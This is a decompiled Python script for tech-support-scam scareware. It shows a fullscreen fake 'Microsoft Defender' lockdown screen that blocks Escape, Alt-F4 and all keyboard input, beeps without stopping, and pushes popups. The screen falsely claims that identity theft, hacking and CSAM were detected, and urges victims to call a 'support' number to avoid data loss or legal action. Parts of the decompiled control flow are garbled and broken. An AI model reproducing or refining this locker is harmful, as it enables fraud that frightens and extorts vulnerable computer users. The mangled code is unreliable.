# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: blockallkeys_bsod.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import tkinter as tk
from tkinter import ttk
import threading
import time
import winsound
import os
from pynput import keyboard

def create_defender_scan_alert():
    root = tk.Tk()
    root.title('DEFENDER SECURITY CENTER')
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.configure(bg='#101820')
    root.update()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    def block_event(event):
        return 'break'
    root.bind('<Escape>', block_event)
    root.bind_all('<Alt-F4>', block_event)
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    canvas = tk.Canvas(root, bg='#101820', highlightthickness=0)
    canvas.place(x=0, y=0, width=screen_width, height=screen_height)
    scan_bar_width = 300
    scan_bar_height = 20
    scan_bar_y = screen_height // 2
    bars = []
    for i in range(scan_bar_width):
        color_intensity = int(255 * (1 - i / scan_bar_width))
        color = f'#00{color_intensity:02x}00'
        rect = canvas.create_rectangle(i, scan_bar_y, i + 1, scan_bar_y + scan_bar_height, fill=color, outline='')
        bars.append(rect)

    def animate_scan_bar():
        pass
        for offset in range(screen_width + scan_bar_width):
            for i, bar in enumerate(bars):
                pass  # postinserted
            x1 = i + offset - scan_bar_width
            x2 = x1 + 1
            if 0 <= x1 < screen_width:
                pass  # postinserted
        canvas.coords(bar, x1, scan_bar_y, x2, scan_bar_y + scan_bar_height)
        else:  # inserted
            pass  # postinserted
        canvas.coords(bar, (-10), scan_bar_y, (-9), scan_bar_y + scan_bar_height)
        else:  # inserted
            pass  # postinserted
        time.sleep(0.005)
    threading.Thread(target=animate_scan_bar, daemon=True).start()

    def play_beep_loop():
        pass
        winsound.Beep(1000, 400)
        time.sleep(0.4)
        continue
    threading.Thread(target=play_beep_loop, daemon=True).start()
    tk.Label(root, text='⚠ DEFENDER SECURITY CENTER ⚠', font=('Segoe UI', 34, 'bold'), fg='#00BFFF', bg='#101820').pack(pady=(40, 10))
    tk.Label(root, text='REAL-TIME SYSTEM THREAT DETECTED', font=('Segoe UI', 24, 'bold'), fg='red', bg='#101820').pack(pady=(0, 20))
    alert_msg = 'Suspicious activity has been detected on this device.\nMicrosoft Defender has initiated a security lockdown.\n\nThreats Identified:\n• Identity theft & unauthorized banking access\n• Remote hacking attempts\n• Potential child sexual abuse material (CSAM)\n\nDo NOT close this window or shut down your device.\n\n📞 Contact Microsoft Certified Support immediately:'
    tk.Label(root, text=alert_msg, font=('Segoe UI', 16), fg='white', bg='#101820', justify='left').pack(padx=100)
    tk.Label(root, text='📞 Microsoft Defender Toll-Free: 1 (800) 000-0000 📞', font=('Segoe UI', 26, 'bold'), fg='yellow', bg='#101820').pack(pady=(30, 20))
    scan_frame = tk.Frame(root, bg='#101820')
    scan_frame.pack(pady=10)
    progress_var = tk.DoubleVar()
    progress_bar = ttk.Progressbar(scan_frame, orient='horizontal', length=600, mode='determinate', variable=progress_var)
    progress_bar.grid(row=0, column=0, sticky='w')
    status_var = tk.StringVar(value='Initializing scan...')
    status_label = tk.Label(scan_frame, textvariable=status_var, font=('Segoe UI', 14), fg='lime', bg='#101820')
    status_label.grid(row=0, column=1, padx=(10, 0))
    icon_var = tk.StringVar(value='|')
    icon_label = tk.Label(scan_frame, textvariable=icon_var, font=('Consolas', 18, 'bold'), fg='lime', bg='#101820')
    icon_label.grid(row=0, column=2, padx=(10, 0))
    scan_steps = ['Checking system32.dll...', 'Scanning user profiles...', 'Analyzing network ports...', 'Validating security keys...', 'Detecting malware signatures...', 'Monitoring unauthorized access...', 'Checking for rootkits...', 'Validating firewall integrity...', 'Verifying registry keys...', 'Finalizing scan...']
    log_path = os.path.join(os.getcwd(), 'defender_fake_scan_log.txt')

    def update_progress_and_threats():
        icons = ['|', '/', '-', '\\']
        icon_index = 0
        percent = 0
        threat_index = 0
        with open(log_path, 'w') as logfile:
            logfile.write('Defender Security Scan Log\n\n')
            if percent <= 100:
                progress_var.set(percent)
                if percent % 10 == 0 and threat_index < len(scan_steps):
                    status_var.set(scan_steps[threat_index])
                    logfile.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {scan_steps[threat_index]}\n")
                    threat_index += 1
                icon_var.set(icons[icon_index])
                icon_index = (icon_index + 1) % len(icons)
                logfile.flush()
                time.sleep(0.4)
                percent += 1
            status_var.set('System locked. Awaiting support response...')
            logfile.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - System Locked.\n")
    threading.Thread(target=update_progress_and_threats, daemon=True).start()
    tk.Label(root, text='Support is available 24/7. Call now to avoid permanent data loss or legal action.\n© Microsoft Defender Security Center', font=('Segoe UI', 14), fg='gray', bg='#101820', justify='center').pack(pady=(0, 20))

    def popup_cascade():
        popup_width = 400
        popup_height = 150
        x_start = screen_width - popup_width - 40
        y_start = 100
        for i in range(5):
            popup = tk.Toplevel(root)
            popup.overrideredirect(True)
            popup.geometry(f'{popup_width}x{popup_height}+{x_start}+{y_start + i * (popup_height + 15)}')
            popup.configure(bg='#F0F0F0', bd=2, relief='solid')
            title_bar = tk.Frame(popup, bg='#0078D7', height=25)
            title_bar.pack(fill='x')
            title_label = tk.Label(title_bar, text='Security Alert', fg='white', bg='#0078D7', font=('Segoe UI', 10, 'bold'))
            title_label.pack(side='left', padx=8)
            tk.Label(popup, text='Unauthorized activity detected.', font=('Segoe UI', 12), fg='black', bg='#F0F0F0').pack(pady=(20, 5))
            tk.Label(popup, text='Call 1 (800) 000-0000 immediately.', font=('Segoe UI', 11, 'bold'), fg='red', bg='#F0F0F0').pack()
            popup.lift()
            popup.attributes('-topmost', True)
            popup.after(5000, popup.destroy)
            time.sleep(1)
    threading.Thread(target=popup_cascade, daemon=True).start()

    def on_press(key):
        return False

    def on_release(key):
        return False

    def start_blocking():
        listener = keyboard.Listener(on_press=on_press, on_release=on_release, suppress=True)
        listener.start()
    threading.Thread(target=start_blocking, daemon=True).start()
    root.mainloop()
if __name__ == '__main__':
    create_defender_scan_alert()